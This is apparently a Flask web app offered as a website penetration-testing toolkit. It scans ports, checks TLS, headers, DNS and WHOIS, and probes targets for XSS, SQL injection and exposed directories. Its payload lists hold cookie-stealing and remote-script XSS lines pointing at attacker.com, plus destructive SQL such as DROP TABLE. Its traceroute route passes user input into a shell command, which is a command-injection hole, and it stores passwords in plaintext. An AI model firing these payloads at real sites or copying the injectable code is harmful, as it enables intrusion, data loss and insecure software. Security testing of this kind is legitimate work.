from flask import Flask, render_template, redirect, url_for, request, flash,  session, jsonify
import json
import socket
import concurrent.futures
import urllib.parse
import requests
import ssl
import whois
import dns.resolver
import OpenSSL
from datetime import datetime
from bs4 import BeautifulSoup
import subprocess
from werkzeug.security import generate_password_hash, check_password_hash
import os
import subprocess
import time
import whatweb
app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Replace with a strong secret key

# Dummy user database (you can replace this with a database)
users = {}

class WebsitePentestToolkit:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.hostname = self._extract_hostname(target_url)
        self.ip_address = self._resolve_ip()
        self.open_ports = []

    def _extract_hostname(self, url: str) -> str:
        """Extract hostname from URL"""
        parsed_url = urllib.parse.urlparse(url)
        return parsed_url.netloc.split(':')[0]

    def _resolve_ip(self) -> str:
        """Resolve hostname to IP address"""
        try:
            return socket.gethostbyname(self.hostname)
        except socket.gaierror:
            return "Could not resolve IP"

    def scan_port(self, port: int) -> dict:
        """Scan a single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.hostname, port))
            if result == 0:
                service = self._get_service_name(port)
                return {'port': port, 'status': 'Open', 'service': service}
            sock.close()
        except Exception:
            return None

    def _get_service_name(self, port: int) -> str:
        """Map common ports to service names"""
        port_services = {
            21: 'FTP', 22: 'SSH', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
            3306: 'MySQL', 5432: 'PostgreSQL', 8080: 'HTTP Alternate'
        }
        return port_services.get(port, 'Unknown')

    def scan_common_ports(self, ports: list = None) -> list:
        """Scan common ports concurrently"""
        if not ports:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080]

        open_ports = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            future_to_port = {executor.submit(self.scan_port, port): port for port in ports}
            for future in concurrent.futures.as_completed(future_to_port):
                result = future.result()
                if result:
                    open_ports.append(result)

        return open_ports

    def analyze_ssl_certificate(self) -> dict:
        """Comprehensive SSL/TLS Certificate Analysis"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as secure_sock:
                    cert = secure_sock.getpeercert(binary_form=True)
                    x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert)
                    return {
                        'subject': self._parse_x509_name(x509.get_subject()),
                        'issuer': self._parse_x509_name(x509.get_issuer()),
                        'version': x509.get_version(),
                        'serial_number': x509.get_serial_number(),
                        'not_before': self._parse_date(x509.get_notBefore()),
                        'not_after': self._parse_date(x509.get_notAfter()),
                        'is_expired': self._is_certificate_expired(x509)
                    }
        except Exception as e:
            return {'error': str(e)}

    def _parse_x509_name(self, x509_name):
        """Parse X509 name into a dictionary"""
        return {name.decode(): value.decode() for name, value in x509_name.get_components()}

    def _parse_date(self, date_bytes: bytes) -> str:
        """Parse certificate date"""
        return datetime.strptime(date_bytes.decode('ascii'), '%Y%m%d%H%M%SZ').strftime('%Y-%m-%d %H:%M:%S')

    def _is_certificate_expired(self, x509):
        """Check if certificate is expired"""
        expiration_date = datetime.strptime(self._parse_date(x509.get_notAfter()), '%Y-%m-%d %H:%M:%S')
        return expiration_date < datetime.now()

    def check_security_headers(self) -> dict:
        """Analyze HTTP Security Headers"""
        try:
            response = requests.get(self.target_url, timeout=5)
            headers = response.headers
            security_headers = {
                'Strict-Transport-Security': 'Missing HSTS',
                'X-Frame-Options': 'Missing clickjacking protection',
                'X-XSS-Protection': 'Missing XSS protection',
                'Content-Security-Policy': 'Missing CSP',
                'X-Content-Type-Options': 'Missing MIME type protection'
            }
            findings = {}
            for header, description in security_headers.items():
                if header.lower() not in (h.lower() for h in headers):
                    findings[header] = description
            return findings
        except Exception as e:
            return {'error': str(e)}

    def detect_technologies(self) -> dict:
        """Detect web technologies and frameworks"""
        try:
            response = requests.get(self.target_url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            technologies = {
                'server': response.headers.get('Server', 'Not detected'),
                'x_powered_by': response.headers.get('X-Powered-By', 'Not detected'),
                'meta_generator': soup.find('meta', attrs={'name': 'generator'})
            }
            return technologies
        except Exception as e:
            return {'error': str(e)}

    def dns_enumeration(self) -> dict:
        """Perform DNS enumeration"""
        dns_records = {}
        record_types = ['A', 'MX', 'NS', 'TXT', 'CNAME']
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.hostname, record_type)
                dns_records[record_type] = [str(rdata) for rdata in answers]
            except Exception:
                dns_records[record_type] = []
        return dns_records

    def whois_lookup(self) -> dict:
        """Perform WHOIS lookup"""
        try:
            domain_info = whois.whois(self.hostname)
            return {
                'domain_name': domain_info.domain_name,
                'registrar': domain_info.registrar,
                'creation_date': str(domain_info.creation_date),
                'expiration_date': str(domain_info.expiration_date),
                'name_servers': domain_info.name_servers,
                'status': domain_info.status
            }
        except Exception as e:
            return {'error': str(e)}

    def whatweb_scan(self) -> dict:
        """Perform WhatWeb scan"""
        try:
            result = subprocess.run(['whatweb', self.target_url], capture_output=True, text=True)
            return {
                'output': result.stdout.strip(),
                'error': result.stderr.strip() if result.stderr else None
            }
        except Exception as e:
            return {'error': str(e)}
    
    def run_tracert(self) -> dict:
        """Run Traceroute on Linux and Tracert on Windows"""
        try:
            if os.name == 'nt':  # Windows
                cmd = f'tracert -d {self.target_url}'
            else:  # Linux/Mac
                cmd = f'traceroute -n {self.target_url}'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode != 0:
                return {'error': f'Tracert command failed: {result.stderr}', 'output': None}

            return {'output': result.stdout.strip(), 'error': None}

        except Exception as e:
            return {'error': str(e)}



class XSSScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.xss_payloads = self._generate_xss_payloads()

    def _generate_xss_payloads(self) -> list:
        """Generate a comprehensive list of XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "\" onerror=alert('XSS') \"",
            "' onclick=alert('XSS') '",
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "javascript:eval('var x=document.createElement(\"script\");x.src=\"http://attacker.com/malicious.js\";document.body.appendChild(x)')",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<script>document.write('<svg/onload=alert(\"XSS\")>')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "'\"><h1>XSS Vulnerability</h1>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>"
        ]

    def scan_reflected_xss(self, parameter: str = None) -> dict:
        """Scan for Reflected XSS vulnerabilities"""
        results = {'vulnerable_parameters': [], 'vulnerable_endpoints': []}
        try:
            parameters = self._extract_form_parameters() if not parameter else [parameter]
            for param in parameters:
                for payload in self.xss_payloads:
                    test_url = self._construct_test_url(param, payload)
                    response = self.session.get(test_url, timeout=5)
                    if self._check_xss_indicators(response, payload):
                        results['vulnerable_parameters'].append({
                            'parameter': param,
                            'payload': payload,
                            'response_length': len(response.text)
                        })
        except Exception as e:
            results['error'] = str(e)
        return results

    def _extract_form_parameters(self) -> list:
        """Extract potential input parameters from forms"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            inputs = soup.find_all('input')
            return [input.get('name') for input in inputs if input.get('name')]
        except Exception:
            return ['q', 'search', 'query']

    def _construct_test_url(self, parameter: str, payload: str) -> str:
        """Construct a URL with XSS payload"""
        encoded_payload = urllib.parse.quote(payload)
        return f"{self.target_url}&{parameter}={encoded_payload}" if '?' in self.target_url else f"{self.target_url}?{parameter}={encoded_payload}"

    def _check_xss_indicators(self, response, payload: str) -> bool:
        """Check response for XSS indicators"""
        payload_indicators = [payload, urllib.parse.quote(payload), urllib.parse.unquote(payload)]
        return any(indicator in response.text for indicator in payload_indicators)

    def scan_stored_xss(self) -> dict:
        """Scan for Stored XSS vulnerabilities"""
        results = {'potential_stored_xss': []}
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                for input_field in inputs:
                    for payload in self.xss_payloads:
                        try:
                            form_data = {input_field.get('name', ''): payload}
                            response = self.session.post(self.target_url, data=form_data)
                            if self._check_xss_indicators(response, payload):
                                results['potential_stored_xss'].append({
                                    'form': str(form),
                                    'input_field': str(input_field),
                                    'payload': payload
                                })
                        except Exception:
                            continue
        except Exception as e:
            results['error'] = str(e)
        return results

    def comprehensive_xss_scan(self) -> dict:
        """Perform comprehensive XSS scanning"""
        return {
            'reflected_xss': self.scan_reflected_xss(),
            'stored_xss': self.scan_stored_xss()
        }

class SQLInjectionScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.sql_payloads = self._generate_sql_payloads()

    def _generate_sql_payloads(self) -> list:
        """Generate a list of SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, username, password FROM users --",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND 'x'='x",
            "' OR 'x'='x' --",
            "' OR 1=1#",
            "' OR 1=1/*"
        ]

    def scan_for_sql_injection(self) -> dict:
        """Scan for SQL injection vulnerabilities"""
        results = {'vulnerable_parameters': []}
        try:
            parameters = self._extract_form_parameters()
            for param in parameters:
                for payload in self.sql_payloads:
                    test_url = self._construct_test_url(param, payload)
                    response = self.session.get(test_url, timeout=5)
                    if self._check_sql_injection_indicators(response):
                        results['vulnerable_parameters'].append({
                            'parameter': param,
                            'payload': payload,
                            'response_length': len(response.text)
                        })
        except Exception as e:
            results['error'] = str(e)
        return results

    def _extract_form_parameters(self) -> list:
        """Extract potential input parameters from forms"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            inputs = soup.find_all('input')
            return [input.get('name') for input in inputs if input.get('name')]
        except Exception:
            return []

    def _construct_test_url(self, parameter: str, payload: str) -> str:
        """Construct a URL with SQL injection payload"""
        encoded_payload = urllib.parse.quote(payload)
        return f"{self.target_url}&{parameter}={encoded_payload}" if '?' in self.target_url else f"{self.target_url}?{parameter}={encoded_payload}"

    def _check_sql_injection_indicators(self, response) -> bool:
        """Check response for SQL injection indicators"""
        sql_indicators = ["error", "syntax", "mysql", "sql", "database", "unrecognized", "warning"]
        return any(indicator in response.text.lower() for indicator in sql_indicators)

class DirectoryEnumerator:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.common_directories = [
            '/admin', '/login', '/uploads', '/images', '/css', '/js', 
            '/api', '/backup', '/config', '/.git', '/.env'
        ]
        self.common_files = [
            '/robots.txt', '/favicon.ico', '/index.php', '/config.php', 
            '/web.config', '/.htaccess'
        ]

    def enumerate_directories(self) -> dict:
        """Check for common directories"""
        found_directories = []
        for directory in self.common_directories:
            url = f"{self.target_url}{directory}"
            response = requests.get(url, allow_redirects=False)
            if response.status_code == 200:
                found_directories.append(url)
        return {'found_directories': found_directories}

    def enumerate_files(self) -> dict:
        """Check for common files"""
        found_files = []
        for file in self.common_files:
            url = f"{self.target_url}{file}"
            response = requests.get(url, allow_redirects=False)
            if response.status_code == 200:
                found_files.append(url)
        return {'found_files': found_files}

    def run_directory_enumeration(self) -> dict:
        """Run both directory and file enumeration"""
        return {
            **self.enumerate_directories(),
            **self.enumerate_files()
        }

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/app')
def dashboard():
    if 'username' in session:
        return render_template('app.html')  # Render app.html if logged in
    return redirect(url_for('login'))  # Redirect to login if not logged in
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username and password:
            if username in users and users[username] == password:
                session['username'] = username  # Set session variable
                return redirect(url_for('dashboard'))  # Redirect to dashboard
            else:
                flash('Invalid username or password')
        else:
            flash('Username and password are required')
    return render_template('login.html')
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users:
            flash('Username already exists')
        else:
            users[username] = password
            flash('Signup successful! You can now log in.')
            return redirect(url_for('login'))
    return render_template('signup.html')

@app.route('/logout')
def logout():
    session.pop('username', None)  # Remove username from session
    return redirect(url_for('login'))

@app.route('/scan', methods=['POST'])
def scan():
    target_url = request.form['url']
    toolkit = WebsitePentestToolkit(target_url)

    # Perform various checks and collect results
    results = {
        'Target URL': target_url,
        'IP Address': toolkit.ip_address,
        'Open Ports': toolkit.scan_common_ports(),
        'SSL Certificate Analysis': toolkit.analyze_ssl_certificate(),
        'Security Headers': toolkit.check_security_headers(),
        'Detected Technologies': toolkit.detect_technologies(),
        'DNS Records': toolkit.dns_enumeration(),
        'WHOIS Information': toolkit.whois_lookup(),
        'WhatWeb Results': toolkit.whatweb_scan(),
        'XSS Results': XSSScanner(target_url).comprehensive_xss_scan(),
        'SQL Injection Results': SQLInjectionScanner(target_url).scan_for_sql_injection(),
        'Directory Enumeration Results': DirectoryEnumerator(target_url).run_directory_enumeration()  # New addition
    }

    return jsonify(results)

@app.route('/mtr', methods=['POST'])
def tracert_scan():
    target_url = request.form.get('url')

    if not target_url:
        return jsonify({'error': 'No URL provided'}), 400  # Return HTTP 400 if no URL is provided

    toolkit = WebsitePentestToolkit(target_url)  # Create an instance of the class
    tracert_results = toolkit.run_tracert()  # Call run_tracert() from the class

    # Debugging logs for Flask console
    print(f"Tracert Results for {target_url}: {tracert_results}")

    if tracert_results.get('error'):
        return jsonify({'error': tracert_results['error']}), 500  # Return HTTP 500 if Tracert fails

    return jsonify(tracert_results)  # Return results as JSON


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Use PORT from env or default to 5000
    app.run(host="0.0.0.0", port=port, debug=True)
